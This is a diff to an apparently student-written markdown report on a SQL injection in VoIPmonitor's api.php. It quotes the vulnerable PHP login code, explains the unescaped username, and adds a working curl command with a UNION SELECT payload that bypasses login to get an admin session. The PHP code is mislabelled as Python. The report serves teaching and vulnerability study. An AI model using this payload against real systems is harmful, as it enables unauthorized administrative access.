@@ -37,13 +37,13 @@ The flow chart of Keylogger[^2]:
 This new sql injects for unauthenticated users allowing gaining admin privileges[^3]
 ![alt text](https://github.com/Fashion-Man/ECE-9609-9069/blob/2096952ca2904c53f01479636923d7ca39375454/cvss.png)
 
-## Voipmonitor[^4] 
+## Voipmonitor[^4][^5] 
 Voipmonitor is a thing used to monitor voip. Using it, you can capture and record the message of each call, and automatically analyze the call result, data jitter, delay, packet loss, etc.,and restore the call sound according to the RTP data of the message.Calls with all relevant statistics are saved to MySQL database.
 
 The bug occurs in the file name api.php which is also located in the webroot[^5].
 
 In the file api.php[^5]:
-```SQL
+```Python
 switch ($_REQUEST["action"]) {
 // snip to line ~36
   case "login":
@@ -79,6 +79,43 @@ function api_login()
         echoError($lang["loginFailed"]);
     }
 ```
+The code above said, Once *login* is set to **action** parameter, it will call a function **api_login()** that handles the login. This function will check the required parameters **user** and **pass** and pass these two parameters to a function named **getUpdateUserLoginData()**. This function will check if the **user** and **pass** are matched and valid. 
+
+The function is in a file named functions.php in the /php/lib/ directory[^5]: 
+```Python
+function getUpdateUserLoginData(&$row, $user, $password, $table = "users", $nextCond = NULL, $assoc = false)
+{
+    $conds = array();
+    if ($password) {
+        array_push($conds, "(length(password) = 32 and `password` = '" . md5($password) . "' or length(password) = 64 and `password` = '" . hash("SHA256", $password) . "')");
+    }
+    if ($user) {
+        array_push($conds, "" . "`username` = '" . $user . "'"); // OOF 1: Adding a user variable without quoting/escaping
+    }
+    if ($nextCond) {
+        array_push($conds, $nextCond);
+    }
+    $Cond = implode(" AND ", $conds); // OOF 2: implode here has no escaping either.
+    if ($assoc) {
+        $row = get_row_assoc("" . "SELECT * from " . $table . " WHERE " . $Cond);
+    } else {
+        $row = get_row("" . "SELECT * from " . $table . " WHERE " . $Cond);
+    }
+    if ($row && $password && $row["password"] == md5($password)) {
+        $rslt = getColumnType($table, "password");
+        if (strpos($rslt, "varchar(64)") !== false || strpos($rslt, "varchar(100)") !== false) {
+            update_row(array("password" => hash("SHA256", $password)), $table, "" . "id = " . $row["id"]);
+        }
+    }
+}
+```
+The variable *$user* is used in an SQL statement without any type of quoting. This is then executed using **get_row()** which is a wrapper around an SQL library that just runs SQL queries. Now, the hacker can build a admin session in order to avoid **user** and **pass** login. 
+```Python
+# curl command used
+curl -v http://192.168.56.103/api.php -d "module=relogin&action=login&pass=nope&user=a' UNION SELECT 'admin','admin',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,1,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null; #"
+```
+![alt text](https://github.com/Fashion-Man/ECE-9609-9069/blob/2096952ca2904c53f01479636923d7ca39375454/cvss.png)
+
 
 ## The users
 Users of SQL injection are typically hackers[^6].
